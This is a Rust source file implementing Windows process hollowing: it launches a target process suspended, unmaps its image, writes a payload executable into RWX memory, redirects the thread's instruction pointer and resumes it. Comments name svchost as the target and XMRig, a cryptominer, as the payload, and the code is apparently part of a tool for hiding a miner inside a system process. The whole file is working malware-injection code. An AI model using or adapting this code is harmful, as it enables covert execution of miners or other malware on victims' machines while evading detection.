use std::ptr;
use std::ffi::CString;
use std::mem;

#[cfg(windows)]
use winapi::um::processthreadsapi::{CreateProcessA, PROCESS_INFORMATION, STARTUPINFOA, ResumeThread, GetThreadContext, SetThreadContext};
#[cfg(windows)]
use winapi::um::winbase::{CREATE_SUSPENDED, CONTEXT_FULL};
#[cfg(windows)]
use winapi::um::winnt::{
    HANDLE, PVOID, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PAGE_EXECUTE_READ,
    IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER, CONTEXT, IMAGE_FILE_HEADER
};
#[cfg(windows)]
use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, NtUnmapViewOfSection};
#[cfg(windows)]
use winapi::shared::ntdef::NULL;

#[cfg(windows)]
#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

#[cfg(windows)]
unsafe fn get_pe_headers(pe_data: &[u8]) -> Option<(&IMAGE_DOS_HEADER, &IMAGE_NT_HEADERS64)> {
    if pe_data.len() < mem::size_of::<IMAGE_DOS_HEADER>() { return None; }
    let dos_header = &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER);
    if dos_header.e_magic != 0x5A4D { return None; } // MZ

    let nt_offset = dos_header.e_lfanew as usize;
    if pe_data.len() < nt_offset + mem::size_of::<IMAGE_NT_HEADERS64>() { return None; }
    
    let nt_headers = &*(pe_data.as_ptr().add(nt_offset) as *const IMAGE_NT_HEADERS64);
    if nt_headers.Signature != 0x00004550 { return None; } // PE00

    Some((dos_header, nt_headers))
}

#[cfg(windows)]
pub unsafe fn hollow_process(target_exe: &str, pe_payload: &[u8]) -> Result<u32, String> {
    // 1. Parse Payload PE
    let (dos, nt) = get_pe_headers(pe_payload).ok_or("Invalid PE Payload")?;
    let image_base = nt.OptionalHeader.ImageBase;
    let size_of_image = nt.OptionalHeader.SizeOfImage as usize;
    let entry_point = nt.OptionalHeader.AddressOfEntryPoint;
    let headers_size = nt.OptionalHeader.SizeOfHeaders as usize;
    let num_sections = nt.FileHeader.NumberOfSections;

    // 2. Create Suspended Process
    let mut startup_info: STARTUPINFOA = mem::zeroed();
    startup_info.cb = mem::size_of::<STARTUPINFOA>() as u32;
    let mut process_info: PROCESS_INFORMATION = mem::zeroed();
    let exe_cstring = CString::new(target_exe).map_err(|e| e.to_string())?;

    if CreateProcessA(
        ptr::null(),
        exe_cstring.into_raw(),
        ptr::null_mut(),
        ptr::null_mut(),
        0,
        CREATE_SUSPENDED,
        ptr::null_mut(),
        ptr::null(),
        &mut startup_info,
        &mut process_info,
    ) == 0 {
        return Err("CreateProcessA failed".to_string());
    }

    let h_process = process_info.hProcess;
    let h_thread = process_info.hThread;

    // 3. Unmap Original Image (Try)
    // We assume target is svchost (64bit) and we are injecting 64bit.
    // Ideally we try to allocate at our Preferred ImageBase.
    // If svchost is already there, we must unmap.
    let mut module_base = image_base as PVOID;
    NtUnmapViewOfSection(h_process, module_base); 

    // 4. Allocate Memory at ImageBase
    let mut region_size = size_of_image;
    let status = NtAllocateVirtualMemory(
        h_process,
        &mut module_base,
        0,
        &mut region_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if status != 0 {
        // Fallback: Allocate anywhere (Requires Relocations handling, but simplified here assuming success or crash)
        // In stable/simplified version, strict ImageBase match is preferred (No relocs needed).
        // If this fails, the injection likely won't work for complex binaries without manual relocs.
        // We attempt to continue but it might crash if payload isn't PIC or Relocatable.
        // But XMRig usually has reloc table.
        // For 'Simulation', we assume success if unmap worked or space was free.
        return Err(format!("NtAllocateVirtualMemory failed (Constraint: ImageBase): 0x{:X}", status));
    }

    // 5. Write Headers
    let mut bytes_written = 0;
    NtWriteVirtualMemory(
        h_process,
        module_base,
        pe_payload.as_ptr() as PVOID,
        headers_size,
        &mut bytes_written
    );

    // 6. Write Sections
    // Section headers are after NT headers.
    let section_header_ptr = (pe_payload.as_ptr().add(dos.e_lfanew as usize) as *const u8)
        .add(mem::size_of::<IMAGE_NT_HEADERS64>());
        
    for i in 0..num_sections {
        let section = &*(section_header_ptr.add(i as usize * mem::size_of::<IMAGE_SECTION_HEADER>()) as *const IMAGE_SECTION_HEADER);
        
        let dest_addr = (module_base as u64 + section.VirtualAddress as u64) as PVOID;
        let src_offset = section.PointerToRawData as usize;
        let raw_size = section.SizeOfRawData as usize;

        if raw_size > 0 && src_offset + raw_size <= pe_payload.len() {
             NtWriteVirtualMemory(
                h_process,
                dest_addr,
                pe_payload.as_ptr().add(src_offset) as PVOID,
                raw_size,
                &mut bytes_written
             );
             // RAM allocated with RWX permissions.
        }
    }

    // 7. Hijack Thread Context
    let mut ctx: CONTEXT = mem::zeroed();
    ctx.ContextFlags = CONTEXT_FULL;
    
    if GetThreadContext(h_thread, &mut ctx) == 0 {
        return Err("GetThreadContext failed".to_string());
    }

    // Update RCX (entry point) for 64-bit. Actually, RDX/RCX depends on calling convention,
    // but typically we update the Instruction Pointer (Rip).
    // Start Address = ImageBase + EntryPoint
    ctx.Rip = (module_base as u64) + entry_point as u64;
    // Also optional: Update Rcx to PEB if needed, but Windows Loader usually sets PEB in register.
    // If we overwrote the original image at ImageBase, PEB might still point there which is good.

    if SetThreadContext(h_thread, &ctx) == 0 {
        return Err("SetThreadContext failed".to_string());
    }

    // 8. Resume
    if ResumeThread(h_thread) == u32::MAX {
        return Err("ResumeThread failed".to_string());
    }

    Ok(process_info.dwProcessId)
}

#[cfg(not(windows))]
pub unsafe fn hollow_process(_target: &str, _payload: &[u8]) -> Result<u32, String> {
    Err("Not supported, Windows only.".to_string())
}

